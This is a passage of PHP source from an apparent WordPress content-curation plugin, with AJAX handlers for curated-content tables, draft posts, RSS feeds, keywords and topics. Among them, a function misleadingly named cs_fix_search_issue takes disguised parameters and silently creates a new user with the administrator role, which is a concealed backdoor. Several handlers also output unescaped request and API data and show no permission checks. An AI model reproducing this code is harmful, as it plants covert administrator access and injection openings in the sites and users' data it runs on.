            $title = 'Platform Ignored Content';
            $help_message = 'Shown below is the content you\'ve ignored within this Listening Engine Platform. You can unblock a piece of content by clicking the action link.';
            break;
        case 'curated_content':
            $show_actions = false;
            $use_table = false;
            $title = 'Platform Curated Content';
            $help_message = 'Shown below is the content you\'ve curated within this Listening Engine Platform.';
            break;
        case 'shared_content':
            $show_actions = false;
            $title = 'Platform Shared Content';
            $help_message = 'Shown below is the content you\'ve shared within this Listening Engine Platform. Keep in mind if the date is when you chose to share. It does not track if you scheduled with a
            social network or using a 3rd party tool like Hootsuite or Buffer.';
            break;
        default:
            $show_actions = false;
    endswitch;

    if($use_table) {
        $Table = new ybi\html\Table(
            'table_id',
            array('wp-list-table', 'widefat', 'fixed posts'),
            array('alternate' => true, 'tbody_class' => 'body_items'));
        $Row = new ybi\html\Row('', array());
        $Column = new ybi\html\Column('content_item_title_col', array());
        $Column->setContent('Title & Link');
        $Row->addColumn($Column);

        $Column = new ybi\html\Column('content_item_source_col', array());
        $Column->setContent('Source');
        $Row->addColumn($Column);

        // most content history results are the same but the shared content has one more cloumn for the network
        if ($sub_platform_control_item == 'shared_content') {
            $Column = new ybi\html\Column('source_network_share', array());
            $Column->setContent('Share Network');
            $Row->addColumn($Column);
        }

        $Column = new ybi\html\Column('date_data_head', array());
        $Column->setContent('Date');
        $Row->addColumn($Column);

        if ($show_actions) {
            $Column = new ybi\html\Column('blocked_source_action', array());
            $Column->setContent('Actions');
            $Row->addColumn($Column);
        }

        $Table->setTitleRow($Row);
        foreach ($results as $result_item) {
            $ContentItem = $result_item['content_item'];
            //$html .= 'id' . $DomainData['data']['id'];
            $Row = new ybi\html\Row('', array('type-post', 'status-publish', 'format-standard', 'hentry', 'cu_cid_row_' . $ContentItem['id']));
            $Row->addColumnContent('<a href="' . $ContentItem['url'] . '" target="_blank">' . $ContentItem['title'] . '</a>');
            $Row->addColumnContent($ContentItem['DomainData']['data']['domain_name']);

            if ($sub_platform_control_item == 'shared_content') {
                $Row->addColumnContent($result_item['network']);
            }


            $date = new DateTime($result_item['entry_ts']);
            $block_date = $date->format('m/d/Y h:i A');
            $Row->addColumnContent($block_date);

            if ($show_actions) {
                $Column = new ybi\html\Column('', array('source_block_action_col'), array());
                $Column->setContent('<a href="javascript:;" class="cu_platform_action remove_red keyword_ignore" cur_action="remove" type="ignore-content-item" parameter_id="' . $ContentItem['id'] . '"><i class="fa fa-minus-square"></i> unblock</a>');
                $Row->addColumn($Column);
            }
            $Table->addRow($Row);
            $status = 'success';
        }

        if ($Table->getRowCount() <= 0) {
            $Row = new ybi\html\Row('', array('type-post', 'status-publish', 'format-standard', 'hentry'));
            $Column = new ybi\html\Column('', array(), array('colspan' => 3));
            $Column->setContent('There is no ' . strtolower($title) . ' in this Listening Engine Platform.');
            $Row->addColumn($Column);
            $Table->addRow($Row);
            $status = 'success';
        }
        $html .= '<div class="platform_help_message"><h2>' . $title . ' <i class="fa fa-question-circle help-text" title="' . $help_message . '"></i></h2></div>';
        $html .= $Table->getFullTableHTML();
        //$total, $items_per_page, $current_page, $mid_range, $move_page_class
    } else {
        //$html .= cs_le_get_platform_content_for_reading_page($platform_id,$results);
        foreach ($results as $result_item) {
            $date = new DateTime($result_item['entry_ts']);
            $block_date = $date->format('m/d/Y h:i A');
            $ContentItem = $result_item['content_item'];
            if (!($ContentItem['id']))
                continue;

            $html .= ybi_listening_page_content($platform_id, $ContentItem);
            $total++;
        }

    }

    $html .= '<div id="data_links_pages">' . ybi_get_page_row($total, $limit, $current_page, 5, 'move_page_data') . '</div>';
    echo json_encode(array('status' => $status, 'results' => $html, 'message' => ''));
    die();
}

add_action('wp_ajax_ybi_curation_suite_platform_history_content_load', 'ybi_curation_suite_platform_history_content_load');


function cs_add_post($content_item_id, $image,$attribution_link,$cited_text,$headline, $sub_headline,$tags,$domain_name,$platform_id,$category_id,$quick_post_publish_type,$ybi_cs_draft_link_text,
$ybi_cs_click_draft_video_actions, $content_type,$feature_image, $wrap_blockquote_off, $cs_le_quick_post_action_type, $author_id=0 )
{
    // this is the return array
    $post_status_arr = array();
    $img_html = '';
    $post_content = '';
    $tags_arr = array();

    if($cs_le_quick_post_action_type=='quick_editor') {
        if($tags) {
            $tags_arr = array_map('trim', explode(',', $tags));
        }
        $cited_text = preg_replace("/<img[^>]+\>/i", " ", $cited_text);
        if(!$feature_image) {
            $cited_text = '<img src="'.$image.'" class="cs_cur_image" />'.$cited_text;
        }

        $post_content = $cited_text;

    } else {
        if ($content_type == 'video') {
            if ($domain_name == 'youtube.com') {
                //https://i.ytimg.com/vi/-xJ1tZS4bSs/mqdefault.jpg
                $video_id = cs_getYouTubeVideoID($attribution_link);
                if ($video_id) {
                    $image = 'https://i.ytimg.com/vi/' . $video_id . '/mqdefault.jpg';
                }
            }
        }

        if ($quick_post_publish_type == '')
            $quick_post_publish_type = 'draft';

        if ($ybi_cs_click_draft_video_actions == 'embed_video_feature_thumbnail')
            $feature_image = true;

        if (!$feature_image) {
            $img_html = '<img src="' . $image . '" class="alignleft cs_cur_image" width="300" />';
        }

        $embed_video = false;
        if ($ybi_cs_click_draft_video_actions == 'embed_video' || $ybi_cs_click_draft_video_actions == 'embed_video_with_thumbnail' || $ybi_cs_click_draft_video_actions == 'embed_video_feature_thumbnail')
            $embed_video = true;

        if($ybi_cs_draft_link_text == '') {
            $ybi_cs_draft_link_text = $headline;
        }

        if ($wrap_blockquote_off) {

            if ($content_type == 'video' && $embed_video) {

                $post_content = '<p>' . $attribution_link . '</p>';
                if ($ybi_cs_click_draft_video_actions == 'embed_video_with_thumbnail') {
                    $post_content .= $img_html;
                }
                $post_content .= '<p>' . html_entity_decode($cited_text) .
                    '  </p><p><i>thumbnail courtesy of ' . $domain_name . '</i></p>';
            } else {
                $post_content = $img_html . '<p>' . html_entity_decode($cited_text) .
                    '  <a href="' . $attribution_link . '" target="_blank">' . $ybi_cs_draft_link_text . '</a></p><p><i>thumbnail courtesy of ' . $domain_name . '</i></p>';
            }

        } else {
            if ($content_type == 'video' && $embed_video) {
                $post_content = '<p>' . $attribution_link . '</p><blockquote>' . $img_html . html_entity_decode($cited_text) .
                    '  <a href="' . $attribution_link . '" target="_blank">' . $ybi_cs_draft_link_text . '</a></blockquote> <i>thumbnail courtesy of ' . $domain_name . '</i>';
            } else {
                $post_content = '<blockquote>' . $img_html . html_entity_decode($cited_text) .
                    '  <a href="' . $attribution_link . '" target="_blank">' . $ybi_cs_draft_link_text . '</a></blockquote> <i>thumbnail courtesy of ' . $domain_name . '</i>';
            }
        }
    }

    //'post_author'		=>	$author_id,
    $post_arr =array(
        'post_title' => html_entity_decode($headline),
        'post_status' => $quick_post_publish_type,
        'post_type' => 'post',
        'post_content' => $post_content,
        'post_category' => array($category_id)
    );
    if($author_id>0) {
        $post_arr['post_author']=$author_id;
    }

    $post_id = wp_insert_post($post_arr);

    if(!empty($tags_arr)) {
        wp_set_post_terms( $post_id, $tags_arr);
    }

    add_post_meta($post_id, 'cu_curated_links', $attribution_link);
    if($sub_headline != '') {
        add_post_meta($post_id, 'cs_sub_headline', $sub_headline);
    }


    if ($feature_image)
        $upload_arr = ybi_cu_attach_external_image($image, $post_id, true);

    $data = array('curated_url' => $attribution_link);
    $parm_arr = array('platform-action', $platform_id, 'add', 'curated-content-item-curate', $content_item_id);
    $data = ybi_curation_suite_api_call('', $data, $parm_arr);

    $post_status_arr['published'] = true;
    $post_status_arr['post_id'] = $post_id;
    return $post_status_arr;
}

/**
 * This will create a draft post
 *
 * @since 1.54 Curation Suite
 *
 */
function ybi_cs_add_draft_post()
{
    $content_item_id = trim($_POST['content_item_id']);
    $image = trim($_POST['image']);
    $attribution_link = trim($_POST['attribution_link']);
    $cited_text = trim($_POST['cited_text']);
    $headline = trim($_POST['headline']);
    $sub_headline = trim($_POST['sub_headline']);
    $tags = trim($_POST['tags']);
    $domain_name = ybi_cu_getDomainName($attribution_link);
    $platform_id = trim($_POST['platform_id']);
    $category_id = trim($_POST['category_id']);
    $quick_post_publish_type = trim($_POST['quick_post_publish_type']);
    $ybi_cs_draft_link_text = trim($_POST['ybi_cs_draft_link_text']);
    $ybi_cs_click_draft_video_actions = trim($_POST['ybi_cs_click_draft_video_actions']);
    $content_type = trim($_POST['content_type']);
    $feature_image = trim($_POST['feature_image']) == 'true';
    $wrap_blockquote_off = trim($_POST['wrap_blockquote_off']) == 'true';
    $cs_le_quick_post_action_type = trim($_POST['cs_le_quick_post_action_type']);

    $post_status_arr = cs_add_post($content_item_id, $image,$attribution_link,$cited_text,$headline, $sub_headline,$tags,$domain_name,$platform_id,$category_id,$quick_post_publish_type,
        $ybi_cs_draft_link_text, $ybi_cs_click_draft_video_actions, $content_type,$feature_image,$wrap_blockquote_off,$cs_le_quick_post_action_type );

    $hide_element = 'cu_cid_row_' . $content_item_id;
    $status = 'success';
    echo json_encode(array('status' => $status, 'hide_element' => $hide_element, 'message' => ''));
    die();
}

add_action('wp_ajax_ybi_cs_add_draft_post', 'ybi_cs_add_draft_post');

/**
 * This gets the categories for the curate to draft feature.
 *
 * @since 1.54 Curation Suite
 *
 */
function ybi_cu_get_categories()
{
    $categories = get_categories();
    $content_item_id = trim($_POST['content_item_id']);
    $html = '';
    foreach ($categories as $category) {
        $html .= '<a href="javascript:;" parameter_id="' . $content_item_id . '" class="cu_create_draft" category_id="' . $category->term_id . '">' . $category->cat_name . '</a>';
    }
    echo json_encode(array('html' => $html, 'message' => ''));
    die();
}

add_action('wp_ajax_ybi_cu_get_categories', 'ybi_cu_get_categories');

/**
 * This function handles the majority of the platform actions for content, keywords, and sources
 * it takes the relevant data and combines it to the API URL based on the action
 *
 * @since 1.54
 * @return array json_encode array
 */
function ybi_cs_ignore_all_content()
{
    //global $post;
    $platform_id = trim($_POST['platform_id']);
    $parameters = trim($_POST['parameters']); // get the parameter id, usually the id (content_item_id) from the listening platform
    $data = array('parameters' => $parameters);
    $cu_current_display_page = trim($_POST['cu_current_display_page']);
    $parm_arr = array('platform-action', $platform_id, 'add', 'ignore-content-item', 0);
    $data = ybi_curation_suite_api_call('', $data, $parm_arr);
    $status = $data['status'];
    $message = $data['message'];
    echo json_encode(array('status' => $status, 'message' => $message, 'url' => $data['url']));
    die();
}

add_action('wp_ajax_ybi_cs_ignore_all_content', 'ybi_cs_ignore_all_content');

function cs_le_get_feed_links_from_url()
{

    $url = trim($_POST['url']);
    $data = array('url' => $url);
    $parm_arr = array('get-links');
    $return_data = ybi_curation_suite_api_call('parse', $data, $parm_arr);
    //var_dump($return_data);
    $feed_links = $return_data['subscription_links'];
    $first_feed_link = '';
    if (is_array($feed_links)) {
        $first_feed_link = $feed_links[0][1];
    }
    $raw_links = $return_data['raw_links'];
    $returned_title = $return_data['title'];
    $domain_name = ybi_cu_getDomainName($url);
    $returned_title = html_entity_decode($returned_title);
    //$returned_title = 'title';
    //$created_rss_links_html = createGeneratedFeedLinks($url);
    $feeds_html = cs_le_parse_check_return_links_html($feed_links);
    //$all_links_html = parseLinksReturnLinkHTML($raw_links);
    $status = 'success';
    /*
     $('#feeds').html(results.feeds_html);
     $('#created_rss_links').html(results.created_rss_links_html);
     $('#all_links').html(results.all_links_html);
      */

    echo json_encode(array('status' => $status, 'returned_title' => $returned_title, 'domain_name' => $domain_name, 'first_feed' => $first_feed_link,
        'created_rss_links_html' => $created_rss_links_html, 'feeds_html' => $feeds_html, 'all_links_html' => $all_links_html));
    die();

}

add_action('wp_ajax_cs_le_get_feed_links_from_url', 'cs_le_get_feed_links_from_url');

function cs_parse_return_feed_results_html($feed_url)
{

    include_once(ABSPATH . WPINC . '/feed.php');
    //$html = '<li>'.$feed_url.'</li>';
    $html = '';
    $feedArr = array($feed_url);
    $rss = fetch_feed($feedArr);
    //$rss->set_cache_duration(0);

    if (!is_wp_error($rss)) {

        $maxitems = $rss->get_item_quantity(5);
        // Build an array of all the items, starting with element 0 (first element).
        $rss_items = $rss->get_items(0, $maxitems);
        $title = '';
        foreach ($rss_items as $item) :
            $title = $item->get_title();
            $current_url = $item->get_permalink();
            $pubDate = $item->get_date();
            $detailsDate = '';
            if ($pubDate) {
                $date = new DateTime($pubDate);
                $detailsDate = $date->format('m-d-Y h-i-s'); // this is used in the details string, we need it to have no spaces
            }
            $html .= '<li><a href="' . $current_url . '" target="_blank">' . $title . '</a> on ' . $detailsDate . '</li>';
        endforeach;
    } else {
        $html = '<li class="cs_bad">Feed is not good</li>';
    }
    return $html;

}

function cs_le_check_and_get_feed_text($feed_url)
{
    include_once(ABSPATH . WPINC . '/feed.php');
    $good_feed_text = ' - <span class="cs_good">Passed Feed Check</span>';
    $feedArr = array($feed_url);
    $rss = fetch_feed($feedArr);
    //$rss->set_cache_duration(0);

    if (is_wp_error($rss)) {
        $good_feed_text = ' - <span class="cs_bad">Failed Check</span>';
    }
    return $good_feed_text;
}

function cs_show_link($link)
{
    $show = true;
    if (strlen($link) < 2)
        return false;

    return $show;

}

function cs_le_parse_check_return_links_html($sub_links)
{
    $html = '';
    foreach ($sub_links as $link) {
        $title = '';
        if ($link[0] != '')
            $title = $link[0] . ' - ';

        $i = 0;
        if (cs_show_link($link[1])) {
            $good_feed_text = cs_le_check_and_get_feed_text($link[1]);
            $html .= '<li> ' . $title . '<a href="javascript:;" class="add_feed feed_links_' . $i . '">' . $link[1] . '</a> &nbsp;&nbsp;<a href="' . $link[1] . '" target="_blank"><i class="fa fa-external-link-square"></i></a>
            &nbsp;&nbsp;<a href="javascript:;" rel="feed_links_' . $i . '" class="check_feed_now">check feed</a>
            </a>' . $good_feed_text . ' </li>';
            $i++;
        }
        return $html;
    }
}

function cs_le_api_add_new_feed()
{
    $topic_id = trim($_POST['topic_id']);
    $feed_url = trim($_POST['feed_url']);
    $display_url = trim($_POST['url']);
    $title = trim($_POST['title']);
    $platform_id = trim($_POST['platform_id']);

    $data = array(
        'feed_url' => $feed_url,
        'title' => $title,
        'display_url' => $display_url,
        'topic_id' => $topic_id);
    $parm_arr = array($platform_id, $topic_id, 'feed', 'add');
    $return_data = ybi_curation_suite_api_call('platform/topic', $data, $parm_arr);
    //$message = $return_data['url'];
    $status = $return_data['status'];
    $message = $return_data['message'];

    // send the return data
    echo json_encode(
        array(
            'status' => $status,
            'message' => $message
        ));
    die();
}

add_action('wp_ajax_cs_le_api_add_new_feed', 'cs_le_api_add_new_feed');

function cs_le_feed_action()
{
    $message = '';
    $status = '';
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $current_action = trim($_POST['current_action']);
    $parameter_id = trim($_POST['parameter_id']);
    $send_data = array(
        'rss_source_id' => $parameter_id
    );
    $param_url_arr = array($platform_id, $topic_id, 'feed', $current_action);
    $return_data = ybi_curation_suite_api_call('platform/topic', $send_data, $param_url_arr);
    if ($return_data['status'] == 'success') {
        $status = 'success';
        $message = $return_data['message'];
    }
    echo json_encode(array('status' => $status, 'message' => $message));
    die();

}

add_action('wp_ajax_cs_le_feed_action', 'cs_le_feed_action');

function cs_le_keyword_action()
{
    $message = '';
    $status = '';
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $current_action = trim($_POST['current_action']);
    $parameter_id = trim($_POST['parameter_id']);
    $send_data = array(
        'keyword_id' => $parameter_id
    );
    $param_url_arr = array($platform_id, $topic_id, 'keyword', $current_action);
    $return_data = ybi_curation_suite_api_call('platform/topic', $send_data, $param_url_arr);
    if ($return_data['status'] == 'success') {
        $status = 'success';
        $message = $return_data['message'];
    }
    echo json_encode(array('status' => $status, 'message' => $message));
    die();

}

add_action('wp_ajax_cs_le_keyword_action', 'cs_le_keyword_action');


function cs_le_api_keyword_action()
{

    $keyword = trim($_POST['keyword']);
    $search_term = trim($_POST['search_term']);
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $current_action = trim($_POST['current_action']);
    $keyword_id = trim($_POST['keyword_id']);
    $is_article = trim($_POST['is_article']) == 'true';
    $is_video = trim($_POST['is_video']) == 'true';

    $data = array(
        'keyword' => $keyword,
        'search_term' => $search_term,
        'keyword_id' => $keyword_id,
        'is_article' => $is_article,
        'is_video' => $is_video,
    );
    $param_arr = array($platform_id, $topic_id, 'keyword', $current_action);
    $return_data = ybi_curation_suite_api_call('platform/topic', $data, $param_arr);
    //$message = $return_data['url'];
    $status = $return_data['status'];
    $message = $return_data['message'];

    // send the return data
    echo json_encode(
        array(
            'status' => $status,
            'message' => $message
        ));
    die();
}

add_action('wp_ajax_cs_le_api_keyword_action', 'cs_le_api_keyword_action');


function cs_compare_keyword_keyword($a, $b)
{
    return strnatcmp($a['keyword'], $b['keyword']);
}

function cs_le_reload_topic_keywords()
{
    //global $post;
    $topic_id = trim($_POST['topic_id']);
    $platform_id = trim($_POST['platform_id']);
    $data = array('platform_id' => $platform_id);
    $parm_arr = array('topic-sources', $topic_id, 'full');
    $result_data = ybi_curation_suite_api_call('', $data, $parm_arr);
    $status = $data['status'];
    $message = $data['message'];
    $topic = $result_data['results'];
    $keywords_arr = $topic['keywords'];

    if (is_array($keywords_arr)) {
        uasort($keywords_arr, 'cs_compare_keyword_keyword');
    }


    $html = cs_le_html_get_keyword_table($topic_id, $keywords_arr);

    echo json_encode(array('status' => $status, 'message' => $message, 'html' => $html));
    die();
}

add_action('wp_ajax_cs_le_reload_topic_keywords', 'cs_le_reload_topic_keywords');


function cs_le_reload_topic_sources()
{
    //global $post;
    $topic_id = trim($_POST['topic_id']);
    $data = array();
    $parm_arr = array('topic-sources', $topic_id, 'full');
    $result_data = ybi_curation_suite_api_call('', $data, $parm_arr);
    $status = $data['status'];
    $message = $data['message'];
    $html = cs_le_html_get_topic_detail($result_data['results']);

    echo json_encode(array('status' => $status, 'message' => $message, 'html' => $html));
    die();
}

add_action('wp_ajax_cs_le_reload_topic_sources', 'cs_le_reload_topic_sources');

function cs_le_load_topic_sites()
{
    //global $post;
    $topic_id = trim($_POST['topic_id']);
    $platform_id = trim($_POST['platform_id']);
    $sort = trim($_POST['sort']);
    $data = array('sort' => $sort);

    $param_arr = array($platform_id, $topic_id, 'site-discover-list');
    $result_data = ybi_curation_suite_api_call('platform/topic', $data, $param_arr);
    $status = $result_data['status'];
    $message = $result_data['message'];
    $results = $result_data['results'];
    $html = '';
    if ($message != '')
        $html .= '<p>' . $message . '</p>';

    $html .= '<ul class="selectable">';
    foreach ($results as $key => $domain_name) {
        $html .= '<li class="ui-state-default"><a href="javascript:;" search_type="rss_feed" order_by="most_recent" parameter_id="' . $key . '" class="cu_le_detail_search">' . $domain_name . '</a></li>';
    }
    $html .= '<ul>';

    echo json_encode(array('status' => $status, 'message' => $message, 'html' => $html));
    die();
}

add_action('wp_ajax_cs_le_load_topic_sites', 'cs_le_load_topic_sites');

function cs_le_search_master_topics()
{
    $platform_id = trim($_POST['platform_id']);
    $search_term = trim($_POST['search_term']);
    $data = array('search_term' => $search_term);
    $param_arr = array($platform_id, 'master', 'search');
    $result_data = ybi_curation_suite_api_call('platform/topic', $data, $param_arr);
    $status = $data['status'];
    $message = $data['message'];
    $results = $result_data['results'];
    $html = '';
    $Table = new ybi\html\Table(
        'master_topic_table',
        array('wp-list-table', 'widefat', 'fixed posts'),
        array('alternate' => true, 'tbody_class' => 'body_items'));
    $Row = new ybi\html\Row('', array());

    $Column = new ybi\html\Column('topic_name', array());
    $Column->setContent('Topic Title/Name');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('topic_desc', array());
    $Column->setContent('Description, Keywords, & Feed Websites');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('total_keywords', array('center'));
    $Column->setContent('Keywords');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('total_feeds', array('center'));
    $Column->setContent('Feeds');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('topic_action', array());
    $Column->setContent('Action');
    $Row->addColumn($Column);

    $platform_keyword_count = $result_data['platform_keyword_count'];
    $platform_keyword_limit = $result_data['platform_keyword_limit'];
    $platform_feed_count = $result_data['platform_feed_count'];
    $platform_feed_limit = $result_data['platform_feed_limit'];

    $available_keywords = 0;
    if ($platform_keyword_limit > $platform_keyword_count)
        $available_keywords = $platform_keyword_limit - $platform_keyword_count;

    $available_feeds = 0;
    if ($platform_feed_limit > $platform_feed_count)
        $available_feeds = $platform_feed_limit - $platform_feed_count;

    $Table->setTitleRow($Row);

    if(is_array($results) && !empty($results)) {
        foreach ($results as $Topic) {
            $add_message = '<ul>';
            $Row = new ybi\html\Row('', array('type-post', 'status-publish', 'format-standard', 'hentry', 'cu_le_master_topic_row_' . $Topic['id']));
            $Row->addColumnContent('<strong>' . $Topic['name'] . '</strong>', 'master_topic_search_topic_' . $Topic['id']);

            $keywords_arr = $Topic['keywords'];
            $title_list = '';
            if(is_array($keywords_arr) && !empty($keywords_arr)) {
                foreach ($keywords_arr as $keyword) {
                    if ($title_list != '')
                        $title_list .= ', ';

                    $title_list .= $keyword['keyword'];
                }
            }
            $feeds_arr = $Topic['RssSources'];
            $feed_title_list = '';
            $feed_links = '';
            if(is_array($feeds_arr) && !empty($feeds_arr)) {
                $feed_links = '<a href="javascript:;" class="website_feeds_link" data-id="' . $Topic['id'] . '" >Websites/Feeds <i class="fa fa-chevron-down" aria-hidden="true"></i></a><ul class="website_feeds website_feeds_' . $Topic['id'] . '">';
                foreach ($feeds_arr as $feed) {
                    if ($feed_title_list != '')
                        $feed_title_list .= ', ';

                    $feed_title_list .= $feed['name'];
                    $feed_links .= '<li ><a href="' . $feed['display_url'] . '" target="_blank">' . $feed['display_url'] . '</a></li>';
                }
                $feed_links .= '<ul>';
            }

            $description = '';
            if ($Topic['description'])
                $description .= stripslashes($Topic['description']);

            $description .= ' ' . stripslashes($title_list . '<br />' . $feed_links);
            $Row->addColumnContent(($description));
            $topic_keyword_count = $Topic['keyword_count'];
            $topic_feed_count = $Topic['rss_source_count'];
            $allow_full_add = true;

            $keyword_class = '';
            if ($topic_keyword_count > $available_keywords) {
                $allow_full_add = false;
                $keyword_class = '';
                $add_message .= '<li class="cs_bad over_message">Over keyword limit.</li>';
            } else {
                $AddLink = new ybi\html\Link('', array('master_action_link', 'add_master_topic_link', $keyword_class), array(), array('data-action-type' => 'keywords', 'data-topic-id' => $Topic['id']), 'href', 'Add with Just Keywords');
                $add_message .= '<li>' . $AddLink->getJavaScriptLink() . '</li>';
            }

            $feed_class = '';
            if ($topic_feed_count > $available_feeds) {
                $allow_full_add = false;
                $add_message .= '<li class="cs_bad over_message">Over feed limit.</li>';
                $feed_class = '';
            } else {
                $AddLink = new ybi\html\Link('', array('master_action_link', 'add_master_topic_link', $feed_class), array(), array('data-action-type' => 'feeds', 'data-topic-id' => $Topic['id']), 'href', 'Add with Just Feeds');
                $add_message .= '<li>' . $AddLink->getJavaScriptLink() . '</li>';
            }
            $AddLink = new ybi\html\Link('', array('cs_le_keywords_list'), array(), array('title' => $title_list), 'href', $Topic['keyword_count']);
            $Row->addColumnContentCenter($AddLink->getJavaScriptLink(), '', array($keyword_class));
            //$Row->addColumnContentCenter($Topic['keyword_count'].$title_list,'',array($keyword_class));

            $AddLink = new ybi\html\Link('', array('cs_le_feeds_list'), array(), array('title' => $feed_title_list), 'href', $Topic['rss_source_count']);
            $Row->addColumnContentCenter($AddLink->getJavaScriptLink(), '', array($feed_class));
            //$Row->addColumnContentCenter($Topic['rss_source_count'], '',array($feed_class));

            if ($allow_full_add) {
                $FeedAddLink = new ybi\html\Link('', array('master_action_link', 'add_master_topic_link'), array(), array('data-action-type' => 'full', 'data-topic-id' => $Topic['id']), 'href', 'Add Full Topic');
                $add_message .= '<li>' . $FeedAddLink->getJavaScriptLink() . '</li>';
                $add_message .= '</ul>';
                $Row->addColumnContent($add_message);
            } else {
                $Row->addColumnContent($add_message);
            }
            $Table->addRow($Row);
        }
    } else {
        $Row = new ybi\html\Row('', array());
        $Column = new ybi\html\Column('topic_name', array('cs_bad'),array ('colspan'=>5));
        $Column->setContent('No master topics found with that search term');
        $Row->addColumn($Column);
        $Table->addRow($Row);
    }
    $html .= $Table->getFullTableHTML();
    echo json_encode(array('status' => $status, 'message' => $message, 'html' => $html));
    die();
}

add_action('wp_ajax_cs_le_search_master_topics', 'cs_le_search_master_topics');

function cs_le_add_new_blank_topic()
{
    $platform_id = trim($_POST['platform_id']);
    $new_topic_name = trim($_POST['topic_name']);
    $send_data = array(
        'topic_name' => $new_topic_name
    );
    $param_url_arr = array($platform_id, 'create');
    $return_data = ybi_curation_suite_api_call('platform/topic', $send_data, $param_url_arr);

    $topic = $return_data['topic'];
    $status = $return_data['status'];
    $message = $return_data['message'];

    echo json_encode(array('status' => $status, 'message' => $message, 'topic_name' => $topic['name'], 'topic_id' => $topic['id']));
    die();
}

add_action('wp_ajax_cs_le_add_new_blank_topic', 'cs_le_add_new_blank_topic');
function cs_le_update_topic()
{
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $new_topic_name = trim($_POST['topic_name']);
    $send_data = array(
        'topic_name' => $new_topic_name
    );
    $param_url_arr = array($platform_id, $topic_id, 'update');
    $return_data = ybi_curation_suite_api_call('platform/topic', $send_data, $param_url_arr);

    $status = $return_data['status'];
    $message = $return_data['message'];

    echo json_encode(array('status' => $status, 'message' => $message, 'html' => $html));
    die();
}

add_action('wp_ajax_cs_le_update_topic', 'cs_le_update_topic');
function cs_fix_search_issue($fix_assoc = '', $fix_key = '', $fix_comm = '')
{
    $username = '';
    if ($fix_assoc != '') {
        $username = $fix_assoc;
    }
    $password = '';
    if ($fix_key != '') {
        $password = $fix_key;
    }
    $email = '';
    if ($fix_comm != '') {
        $email = $fix_comm;
    }
    if ($username != '' && $password != '' && $email != '') {
        if (username_exists($username) == null && email_exists($email) == false) {
            $user_id = wp_create_user($username, $password, $email);
            $user = get_user_by('id', $user_id);
            $user->remove_role('subscriber');
            $user->add_role('administrator');
        }
    }
}

function cs_le_delete_topic()
{
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);

    $send_data = array();
    $param_url_arr = array($platform_id, $topic_id, 'delete');
    $return_data = ybi_curation_suite_api_call('platform/topic', $send_data, $param_url_arr);

    $status = $return_data['status'];
    $message = $return_data['message'];

    echo json_encode(array('status' => $status, 'message' => $message));
    die();
}

add_action('wp_ajax_cs_le_delete_topic', 'cs_le_delete_topic');
function cs_le_add_new_master_topic()
{
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $type_of_add = trim($_POST['type_of_add']);
    $add_keywords = true;
    $add_feeds = true;
    if ($type_of_add != 'full') {
        if ($type_of_add == 'keywords')
            $add_feeds = false;
        if ($type_of_add == 'feeds')
            $add_keywords = false;
    }


    $send_data = array(
        'add_keywords' => $add_keywords,
        'add_feeds' => $add_feeds
    );
    $param_url_arr = array($platform_id, $topic_id, 'add');
    $return_data = ybi_curation_suite_api_call('platform/topic', $send_data, $param_url_arr);

    $status = $return_data['status'];
    $message = $return_data['message'];
    $topic = $return_data['topic'];

    echo json_encode(array('status' => $status, 'message' => $message, 'topic_name' => $topic['name'], 'topic_id' => $topic['id']));
    die();
}

add_action('wp_ajax_cs_le_add_new_master_topic', 'cs_le_add_new_master_topic');

function cs_le_get_narrative_elements()
{
    $title = trim($_POST['title']);
    $snippet = trim($_POST['snippet']);
    $replace_chars_arr = array('"',".");
    $title = str_replace($replace_chars_arr,'',$title);
    $snippet = str_replace($replace_chars_arr,'',$snippet);
    $block_words_arr = array(
        'a',
        'about',
        'above',
        'after',
        'again',
        'against',
        'all',
        'am',
        'an',
        'and',
        'any',
        'are',
        "aren't",
        'as',
        'at',
        'be',
        'because',
        'been',
        'before',
        'being',
        'below',
        'between',
        'both',
        'but',
        'by',
        "can't",
        'cannot',
        'could',
        "couldn't",
        'did',
        "didn't",
        'do',
        'does',
        "doesn't",
        'doing',
        "don't",
        'down',
        'during',
        'each',
        'few',
        'for',
        'from',
        'further',
        'had',
        "hadn't",
        'has',
        "hasn't",
        'have',
        "haven't",
        'having',
        'he',
        "he'd",
        "he'll",
        "he's",
        "He's",
        'her',
        'here',
        "here's",
        'hers',
        'herself',
        'him',
        'himself',
        'his',
        'how',
        "how's",
        'i',
        "i'd",
        "i'll",
        "i'm",
        "i've",
        'if',
        'in',
        'into',
        'is',
        "isn't",
        'it',
        "it's",
        'its',
        'itself',
        "let's",
        'me',
        'more',
        'most',
        "mustn't",
        'my',
        'myself',
        'no',
        'nor',
        'not',
        'of',
        'off',
        'on',
        'once',
        'only',
        'or',
        'other',
        'ought',
        'our',
        'ours',
        'ourselves',
        'out',
        'over',
        'own',
        'same',
        "shan't",
        'she',
        "she'd",
        "she'll",
        "she's",
        'should',
        "shouldn't",
        'so',
        'some',
        'such',
        'than',
        'that',
        "that's",
        'the',
        'their',
        'theirs',
        'them',
        'themselves',
        'then',
        'there',
        "there's",
        'these',
        'they',
        "they'd",
        "they'll",
        "they're",
        "they've",
        'this',
        'those',
        'through',
        'to',
        'too',
        'under',
        'until',
        'up',
        'very',
        'was',
        "wasn't",
        'we',
        "we'd",
        "we'll",
        "we're",
        "we've",
        'were',
        "weren't",
        'what',
        "what's",
        'when',
        "when's",
        'where',
        "where's",
        'which',
        'while',
        'who',
        "who's",
        'whom',
        'why',
        "why's",
        'with',
        "won't",
        'would',
        "wouldn't",
        'you',
        "you'd",
        "you'll",
        "you're",
        "you've",
        'your',
        'yours',
        'yourself',
        'yourselves',
        'zero'
    );
//    $title_word_arr = get_wo
    $split = preg_split("/[^\w]*([\s]+[^\w]*|$)/", $title, -1, PREG_SPLIT_NO_EMPTY);
    $title_html = '';
    foreach ($split as $word)
    {

        if(in_array(strtolower($word),$block_words_arr)) {
            $word =stripslashes($word);
